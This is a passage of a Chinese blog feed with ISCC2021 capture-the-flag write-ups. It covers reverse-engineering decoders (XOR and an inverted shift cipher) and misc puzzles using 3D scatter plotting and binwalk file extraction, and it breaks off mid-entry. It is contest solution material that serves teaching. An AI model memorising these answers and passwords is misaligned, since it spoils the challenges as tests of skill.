class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1TWDS_VJO2LOqlKniR__4uA </span><br><span class="line">提取码：more </span><br><span class="line">复制这段内容后打开百度网盘手机App，操作更方便哦</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ISCC2021-Re部分题解</title>
      <link href="/2021/06/14/ISCC2021-Re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
      <url>/2021/06/14/ISCC2021-Re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>﻿## ISCC2021 RE wp<br>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p><h2 id="练武题"><a href="#练武题" class="headerlink" title="练武题"></a>练武题</h2><h2 id="0x00-Garden"><a href="#0x00-Garden" class="headerlink" title="0x00 Garden"></a>0x00 Garden</h2><p><strong>题目描述：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">花园里藏了一个小宝贝，你能找到他吗？</span><br></pre></td></tr></table></figure><p>pyc文件直接反编译然后看源码<br><a href="https://tool.lu/pyc/">在线工具</a><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210607132515425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong>异或顺序随便换 但是最后的结果不变，相异为一，相同为零。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f= <span class="string">&#x27;2(88\x006\x1a\x10\x10\x1aIKIJ+\x1a\x10\x10\x1a\x06&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;</span></span><br><span class="line"><span class="string">for i in f:</span></span><br><span class="line"><span class="string">     flag+=chr(ord(i)^123)</span></span><br><span class="line"><span class="string">print(flag)</span></span><br></pre></td></tr></table></figure><h2 id="0x01-Analysis"><a href="#0x01-Analysis" class="headerlink" title="0x01  Analysis"></a>0x01  Analysis</h2><p>题目描述：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分析就完事了！</span><br></pre></td></tr></table></figure><p>打开IDA分析<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210607133006540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong>通过字符串 找到关键点：</strong><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210607133043817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>进入mix查看：<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210607133340625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">cpt = [<span class="number">67</span>,-<span class="number">33</span>,<span class="number">20</span>,<span class="number">3</span>,<span class="number">13</span>,<span class="number">44</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">8</span>,-<span class="number">4</span>,<span class="number">43</span>,-<span class="number">6</span>,<span class="number">20</span>,<span class="number">23</span>,-<span class="number">7</span>,<span class="number">37</span>,-<span class="number">11</span>,<span class="number">34</span>,<span class="number">61</span>,-<span class="number">50</span>,<span class="number">24</span>,<span class="number">22</span>,<span class="number">10</span>]</span><br><span class="line">mix = [<span class="number">82</span>,<span class="number">69</span>,<span class="number">86</span>,<span class="number">69</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">69</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mix)):</span><br><span class="line">    mix[k] %= <span class="number">64</span> </span><br><span class="line">  <span class="comment">#加密用的密钥都是取余之后的，所以先取余操作</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cpt)):</span><br><span class="line">    <span class="keyword">if</span> mix[n%<span class="number">7</span>] &amp; <span class="number">1</span>:</span><br><span class="line">        cpt[n] -= <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cpt[n] -= <span class="number">1</span></span><br><span class="line">  <span class="comment">#先逆加一和加二      </span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cpt)//<span class="number">2</span>):</span><br><span class="line">    x = cpt[m]</span><br><span class="line">    cpt[m] = cpt[<span class="built_in">len</span>(cpt)-<span class="number">1</span>-m]</span><br><span class="line">    cpt[<span class="built_in">len</span>(cpt)-<span class="number">1</span>-m] = x</span><br><span class="line"> <span class="comment">#对称互换</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cpt)):</span><br><span class="line">    cpt[l] -= mix[l%<span class="number">7</span>]</span><br><span class="line"> <span class="comment">#逆自加，既自减</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cpt)-<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    cpt[j] += cpt[j+<span class="number">1</span>]</span><br><span class="line"> <span class="comment">#从后往前，因为最后一个字符是不变的</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cpt)):</span><br><span class="line">    cpt[i] += <span class="number">64</span></span><br><span class="line">  <span class="comment">#加回64</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cpt)):</span><br><span class="line">    cpt[i] = <span class="built_in">chr</span>(cpt[i])</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(cpt)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ISCC2021 MISC wp</title>
      <link href="/2021/06/10/ISCC2021%20MISC%20wp/"/>
      <url>/2021/06/10/ISCC2021%20MISC%20wp/</url>
      
        <content type="html"><![CDATA[<p>﻿## ISCC2021 MISC wp<br>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p><h2 id="练武题"><a href="#练武题" class="headerlink" title="练武题"></a>练武题</h2><h2 id="0x00-Retrieve-the-passcode"><a href="#0x00-Retrieve-the-passcode" class="headerlink" title="0x00 Retrieve the passcode"></a>0x00 Retrieve the passcode</h2><p><strong>题目描述：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Scatter说他能解开这个古怪的密码，你呢？来试试吧！</span><br><span class="line">Flag格式：ISCC&#123;XXX&#125;，XXX为小写字符串，不包括空格</span><br></pre></td></tr></table></figure><p>将scatter.txt的内容整理过后得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">1:3:1  </span><br><span class="line">1.25:3:1  </span><br><span class="line">1.5:3:1  </span><br><span class="line">1.75:3:1  </span><br><span class="line">2:3:1  </span><br><span class="line">2:2.75:1  </span><br><span class="line">2:2.5:1  </span><br><span class="line">2:2.25:1  </span><br><span class="line">2:2:1  </span><br><span class="line">2:1.75:1  </span><br><span class="line">2:1.5:1  </span><br><span class="line">1:2.25:1  </span><br><span class="line">1.25:2.25:1  </span><br><span class="line">1.5:2.25:1  </span><br><span class="line">1.75:2.25:1  </span><br><span class="line">1:1.5:1  </span><br><span class="line">1.25:1.5:1  </span><br><span class="line">1.5:1.5:1  </span><br><span class="line">1.75:1.5:1  </span><br><span class="line">3:3:1  </span><br><span class="line">3.25:3:1  </span><br><span class="line">3.5:3:1  </span><br><span class="line">3.75:3:1  </span><br><span class="line">4:3:1  </span><br><span class="line">3.25:2.25:1  </span><br><span class="line">3.5:2.25:1  </span><br><span class="line">3.75:2.25:1  </span><br><span class="line">4:2.25:1  </span><br><span class="line">4:2:1  </span><br><span class="line">4:1.75:1  </span><br><span class="line">4:1.5:1  </span><br><span class="line">3:1.5:1  </span><br><span class="line">3.25:1.5:1  </span><br><span class="line">3.5:1.5:1  </span><br><span class="line">3.75:1.5:1  </span><br><span class="line">3:1.75:1  </span><br><span class="line">3:2:1  </span><br><span class="line">3:2.25:1  </span><br><span class="line">3:2.5:1  </span><br><span class="line">3:2.75:1  </span><br><span class="line">5:3:1  </span><br><span class="line">5.25:3:1  </span><br><span class="line">5.5:3:1  </span><br><span class="line">5.75:3:1  </span><br><span class="line">6:3:1  </span><br><span class="line">6:2.25:1  </span><br><span class="line">6:2:1  </span><br><span class="line">6:1.75:1  </span><br><span class="line">6:1.5:1  </span><br><span class="line">5.75:1.5:1  </span><br><span class="line">5.5:1.5:1  </span><br><span class="line">5.25:1.5:1  </span><br><span class="line">5:1.5:1  </span><br><span class="line">5:2.25:1  </span><br><span class="line">5.25:2.25:1  </span><br><span class="line">5.5:2.25:1  </span><br><span class="line">5.75:2.25:1  </span><br><span class="line">5:2.5:1  </span><br><span class="line">5:2.75:1  </span><br><span class="line">7:3:1  </span><br><span class="line">7.25:3:1  </span><br><span class="line">7.5:3:1  </span><br><span class="line">7.75:3:1  </span><br><span class="line">8:3:1  </span><br><span class="line">8:2.75:1  </span><br><span class="line">8:2.5:1  </span><br><span class="line">8:2.25:1  </span><br><span class="line">8:2:1  </span><br><span class="line">8:1.75:1  </span><br><span class="line">8:1.5:1  </span><br><span class="line">9:3:1  </span><br><span class="line">9.25:3:1  </span><br><span class="line">9.5:3:1  </span><br><span class="line">9.75:3:1  </span><br><span class="line">10:3:1  </span><br><span class="line">10:2.75:1  </span><br><span class="line">10:2.5:1  </span><br><span class="line">10:2.25:1  </span><br><span class="line">9.75:2.25:1  </span><br><span class="line">9.5:2.25:1  </span><br><span class="line">9.25:2.25:1  </span><br><span class="line">9:2.25:1  </span><br><span class="line">9:2:1  </span><br><span class="line">9:1.75:1  </span><br><span class="line">9:1.5:1  </span><br><span class="line">9.25:1.5:1  </span><br><span class="line">9.5:1.5:1  </span><br><span class="line">9.75:1.5:1  </span><br><span class="line">10:1.5:1  </span><br><span class="line">11:3:1  </span><br><span class="line">11.25:3:1  </span><br><span class="line">11.5:3:1  </span><br><span class="line">11.75:3:1  </span><br><span class="line">12:3:1  </span><br><span class="line">12:2.75:1  </span><br><span class="line">12:2.5:1  </span><br><span class="line">12:2.25:1  </span><br><span class="line">12:2:1  </span><br><span class="line">12:1.75:1  </span><br><span class="line">12:1.5:1  </span><br><span class="line">11.75:1.5:1  </span><br><span class="line">11.5:1.5:1  </span><br><span class="line">11.25:1.5:1  </span><br><span class="line">11:1.5:1  </span><br><span class="line">11:1.75:1  </span><br><span class="line">11:2:1  </span><br><span class="line">11:2.25:1  </span><br><span class="line">11:2.5:1  </span><br><span class="line">11:2.75:1  </span><br><span class="line">11.25:2.25:1  </span><br><span class="line">11.5:2.25:1  </span><br><span class="line">11.75:2.25:1</span><br></pre></td></tr></table></figure><p>先百度一下scatter<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210526200016506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>看到刚才整理的txt文件和百度查到的 初步猜想这是一个三维图像</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line">dot1 = [[<span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">1.25</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">1.5</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">1.75</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">2.75</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">2.5</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">1.75</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">1.25</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">1.5</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">1.75</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">1.25</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">1.5</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">1.75</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">3.25</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">3.5</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">3.75</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">4</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">3.25</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">3.5</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">3.75</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">4</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>], [<span class="number">4</span>, <span class="number">1.75</span>, <span class="number">1</span>], [<span class="number">4</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">3.25</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">3.5</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">3.75</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">1.75</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">2.5</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">2.75</span>, <span class="number">1</span>], [<span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">5.25</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">5.5</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">5.75</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">6</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">6</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">6</span>, <span class="number">2</span>, <span class="number">1</span>], [<span class="number">6</span>, <span class="number">1.75</span>, <span class="number">1</span>], [<span class="number">6</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">5.75</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">5.5</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">5.25</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">5</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">5</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">5.25</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">5.5</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">5.75</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">5</span>, <span class="number">2.5</span>, <span class="number">1</span>], [<span class="number">5</span>, <span class="number">2.75</span>, <span class="number">1</span>], [<span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">7.25</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">7.5</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">7.75</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">8</span>, <span class="number">2.75</span>, <span class="number">1</span>], [<span class="number">8</span>, <span class="number">2.5</span>, <span class="number">1</span>], [<span class="number">8</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">8</span>, <span class="number">2</span>, <span class="number">1</span>], [<span class="number">8</span>, <span class="number">1.75</span>, <span class="number">1</span>], [<span class="number">8</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">9</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">9.25</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">9.5</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">9.75</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">10</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">10</span>, <span class="number">2.75</span>, <span class="number">1</span>], [<span class="number">10</span>, <span class="number">2.5</span>, <span class="number">1</span>], [<span class="number">10</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">9.75</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">9.5</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">9.25</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">9</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">9</span>, <span class="number">2</span>, <span class="number">1</span>], [<span class="number">9</span>, <span class="number">1.75</span>, <span class="number">1</span>], [<span class="number">9</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">9.25</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">9.5</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">9.75</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">10</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">11</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">11.25</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">11.5</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">11.75</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">12</span>, <span class="number">3</span>, <span class="number">1</span>], [<span class="number">12</span>, <span class="number">2.75</span>, <span class="number">1</span>], [<span class="number">12</span>, <span class="number">2.5</span>, <span class="number">1</span>], [<span class="number">12</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">12</span>, <span class="number">2</span>, <span class="number">1</span>], [<span class="number">12</span>, <span class="number">1.75</span>, <span class="number">1</span>], [<span class="number">12</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">11.75</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">11.5</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">11.25</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">11</span>, <span class="number">1.5</span>, <span class="number">1</span>], [<span class="number">11</span>, <span class="number">1.75</span>, <span class="number">1</span>], [<span class="number">11</span>, <span class="number">2</span>, <span class="number">1</span>], [<span class="number">11</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">11</span>, <span class="number">2.5</span>, <span class="number">1</span>], [<span class="number">11</span>, <span class="number">2.75</span>, <span class="number">1</span>], [<span class="number">11.25</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">11.5</span>, <span class="number">2.25</span>, <span class="number">1</span>], [<span class="number">11.75</span>, <span class="number">2.25</span>, <span class="number">1</span>]]  <span class="comment"># 得到五个点</span></span><br><span class="line">plt.figure()  <span class="comment"># 得到画面</span></span><br><span class="line">ax1 = plt.axes(projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line">ax1.set_xlim(<span class="number">0</span>, <span class="number">15</span>)  <span class="comment"># X轴，横向向右方向</span></span><br><span class="line">ax1.set_ylim(<span class="number">15</span>, <span class="number">0</span>)  <span class="comment"># Y轴,左向与X,Z轴互为垂直</span></span><br><span class="line">ax1.set_zlim(<span class="number">0</span>, <span class="number">15</span>)  <span class="comment"># 竖向为Z轴</span></span><br><span class="line">color1 = [<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;m&#x27;</span>]</span><br><span class="line">marker1 = [<span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;H&#x27;</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> dot1:</span><br><span class="line">    ax1.scatter(x[<span class="number">0</span>], x[<span class="number">1</span>], x[<span class="number">2</span>], c=color1[<span class="number">1</span>],</span><br><span class="line">                marker=marker1[<span class="number">1</span>], linewidths=<span class="number">4</span>)  <span class="comment"># 用散点函数画点</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>运行之后得到：<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210526200327393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><strong>密码口令是365728</strong>  然后解压压缩包 得到PDF文件<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210526200628610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p>摩斯密码加密得到flag</p><h2 id="0x01-海市蜃楼-1"><a href="#0x01-海市蜃楼-1" class="headerlink" title="0x01 海市蜃楼-1"></a>0x01 海市蜃楼-1</h2><p><strong>题目描述：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">或许你看到的只是海市蜃楼…</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/2021052620105046.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>打开docx文件后发现了zip 文件的开头PK<br>修改后缀后  在解压文件中 可以找到flag</p><h2 id="0x02-李华的红包"><a href="#0x02-李华的红包" class="headerlink" title="0x02 李华的红包"></a>0x02 李华的红包</h2><p><strong>题目描述：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大年初一，李华给爸爸拜年，从事计算机行业的父亲发给李华一张图片和一张银行卡。父亲告诉李华密码就藏在图片中，但是李华打开图片后却百思不得其解。你能帮助李华拿到密码吗？</span><br></pre></td></tr></table></figure><p>用binwalk 分离出来一个txt文件<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210526201938505.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>这个图片很明显不完全  修改宽高后得到：<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210526202819283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>联想到敲击码<br><img "" class="lazyload placeholder" 